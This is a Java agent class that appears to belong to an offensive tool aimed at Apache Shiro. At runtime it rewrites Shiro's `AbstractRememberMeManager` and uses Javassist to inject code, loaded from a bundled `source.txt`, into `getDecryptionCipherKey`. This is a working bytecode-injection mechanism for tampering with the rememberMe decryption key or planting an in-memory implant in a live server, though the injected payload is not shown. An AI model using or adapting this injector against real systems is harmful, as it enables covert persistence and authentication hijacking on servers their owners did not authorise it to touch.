package net.shiroha.agent;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {

    public String readSource() {
        StringBuffer source = new StringBuffer();
        InputStream is = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return source.toString();
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        final String shiroClassName = "org.apache.shiro.mgt.AbstractRememberMeManager";
        final String equalName = "org/apache/shiro/mgt/AbstractRememberMeManager";
        final String methodName = "getDecryptionCipherKey";
        if (className.equals(equalName)) {
            try {
                ClassPool cp = ClassPool.getDefault();
                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(classPath);

                CtClass cc = cp.get(shiroClassName);
                CtMethod m = cc.getDeclaredMethod(methodName);
                m.insertBefore(readSource());
                byte[] bytes = cc.toBytecode();
                cc.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }
        return null;
    }
}
